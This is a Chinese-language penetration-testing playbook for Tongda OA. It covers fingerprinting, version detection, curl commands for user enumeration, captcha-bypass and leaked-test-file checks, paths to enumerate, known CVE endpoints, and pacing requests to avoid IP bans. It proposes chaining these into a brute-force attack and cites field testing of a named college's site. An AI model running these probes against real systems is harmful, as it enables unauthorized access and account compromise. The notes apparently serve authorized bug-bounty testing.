# 通达OA (Office Anywhere) 测试模式

## 识别特征
- `tongda.ico` favicon
- `static/js/rsa/jsbn.js`, `static/js/rsa/prng4.js`, `static/js/rsa/rng.js`, `static/js/rsa/rsa.js`
- 登录表单: `form1`, `action="logincheck.php"`, 字段 `UNAME` + `PASSWORD`
- RSA加密: 前端JS硬编码 `modulus` + `exponent` (通常 `10001`)
- 版权: `tongda2000.com` 官网链接, "通达OA移动版"
- 404响应: "No input file specified." (PHP fastcgi)
- 错误页含 "Office Anywhere 疑难解答/清空admin密码"

## 版本识别
- **2025版本**: CSS路径 `static/templates/2025_year_01/`, JS含 `tspiritsdk/ispirit_sdk.js?v=20240530202303`
- **2023版本**: CSS路径 `static/templates/2023_year_01/`
- **旧版模板仍存在**: `static/templates/2015_01/`, `static/templates/2016_01/`

## 高价值漏洞

### 1. 用户枚举 (中危) — 仅限旧版本
登录接口 `logincheck.php` 返回不同错误信息:
- 存在的用户: `用户名或密码错误，注意大小写!`
- 不存在的用户: `帐号密码错误！`

```bash
curl -sk -X POST "https://TARGET/logincheck.php" -d "UNAME=admin&PASSWORD=dGVzdA==" | grep -oP 'msg-content">\K[^<]*'
```

### 2. 验证码绕过 (中危) — 仅限旧版本
验证码不是强制的，缺失或错误时仍正常处理登录请求:
```bash
# 空验证码
curl -sk -X POST "https://TARGET/logincheck.php" -d "UNAME=admin&PASSWORD=dGVzdA==&captcha="
# 错误验证码
curl -sk -X POST "https://TARGET/logincheck.php" -d "UNAME=admin&PASSWORD=dGVzdA==&captcha=0000"
# 无验证码参数
curl -sk -X POST "https://TARGET/logincheck.php" -d "UNAME=admin&PASSWORD=dGVzdA=="
# 三种情况均返回正常错误信息 = 验证码未生效
```

### 3. 扫码登录接口暴露
```bash
# 获取codeuid和authcode
curl -sk "https://TARGET/ispirit/login_code.php"
# 返回: {"codeuid":"{UUID}","authcode":"LOGIN_CODE..."}
# 验证码图片
curl -sk "https://TARGET/general/login_code.php"  # 返回PNG
```

### 4. 测试文件泄露
```bash
# Oracle数据库连接测试
curl -sk "https://TARGET/test.php"
# 可能返回: "Oracle 连接成功！"
# 其他测试文件: test1.php, db_test.php, conn_test.php, config.php
```

### 5. RSA公钥泄露 (低危)
前端JS硬编码RSA加密参数:
```bash
curl -sk "https://TARGET/" | grep -oP 'modulus = "[^"]*"'
curl -sk "https://TARGET/" | grep -oP 'exponent = "[^"]*"'
```

## 常见路径枚举
```
logincheck.php          # 登录接口 (200)
logincheck_code.php     # 扫码登录接口 (200)
index.php               # 登录页 (200)
ispirit/login_code.php  # 扫码登录API (200)
ispirit/interface/gateway.php  # 接口网关 (200=存在, 返回RELOGIN需登录)
module/captcha/captcha_output.php  # 验证码输出 (200)
module/captcha/captcha_op.php  # 验证码操作 (200)
module/ueditor/php/controller.php  # UEditor (2025: 返回"用户未登录")
general/workflow/new/index.php  # 工作流 (200, 压缩内容)
general/email/          # 邮件模块 (200)
general/file_folder/    # 文件管理 (200)
static/js/login.js      # 登录JS (200)
static/js/index.js      # 首页JS (200)
static/images/tongda.ico  # 通达图标 (200)
```

## 已知CVE路径 (通常返回404 "No input file specified")
```
ispirit/interface/gateway.php  # CNVD-2020-26585 RCE (需登录态,返回RELOGIN)
general/system/seal_manage/iweboffice/sealattach.php  # 文件包含
general/reportshop/utils/send.php  # 文件包含
general/mytable/executeSql.php  # SQL注入
general/system/syslog/syslog.php  # 日志泄露
```

## ⚠️ 通达OA 2025 版本行为变化 (2026-06 gfxy.com 实战)

**关键行为变化**:
1. `gateway.php` 返回 "RELOGIN" — 确认端点存在但需登录态，不再是未授权RCE入口
2. `module/ueditor/php/controller.php` 返回 "用户未登录" — UEditor也加了认证
3. `logincheck_code.php` 所有参数组合均返回 `{"status":0,"msg":"参数错误！"}` — 需正确CODE流程
4. `ispirit/im/upload.php` 返回 "-ERR 用户未登陆" — 即时通讯上传需认证
5. 所有 `delete.php` 端点(vote/notify/news/meeting/hr)返回登录页HTML — 全部需认证
6. `login_code.php` 仍返回 `codeuid` + `authcode` JSON — 公开设计，非漏洞

**2025版本结论**: 所有敏感端点均已认证保护。未发现未授权RCE。需测试账号才能继续深测。

**IP速率限制**: 大量请求后OA系统会封禁源IP(所有请求返回0字节/连接拒绝)。HTTP和HTTPS均被封。建议控制请求频率(每请求间隔2-3秒)，先用浏览器工具确认可达性再用curl。

**2025版模板路径**: `/static/templates/2025_year_01/` (含 `login_bg.png?20241218`, `logo-2025.png?2qee023`)

## 密码加密方式
通达OA使用RSA加密密码，前端JS提取modulus和exponent后加密:
```javascript
var modulus = "B87A3BE2184FED0973FFB0B0...";
var exponent = "10001";
var rsa = new RSAKey();
rsa.setPublic(modulus, exponent);
document.form1.PASSWORD.value = rsa.encrypt(psw);
```
弱口令测试需要先用RSA加密密码，不能直接发送明文。

## 指纹识别决策树
1. `tongda.ico` 或 `tongda2000.com` → 确认通达OA
2. `logincheck.php` + `UNAME`/`PASSWORD` → 确认登录接口
3. `static/js/rsa/` → 确认RSA加密
4. 404响应含 "No input file specified" → PHP fastcgi配置
5. "Office Anywhere" → 确认通达OA品牌
6. CSS `2025_year_01` → 2025版本

## 报告角度
- "通达OA系统存在用户枚举漏洞可枚举有效用户名" [中危]
- "通达OA系统存在验证码绕过漏洞可暴力破解登录" [中危]
- "通达OA系统存在数据库测试文件泄露" [中危]
- 可组合提交: 用户枚举 + 验证码绕过 → 暴力破解攻击链

## 参考
- `src-vuln-hunting` → `references/gfxy-education-testing-patterns.md` — 陕西国防工业职业技术学院测试记录
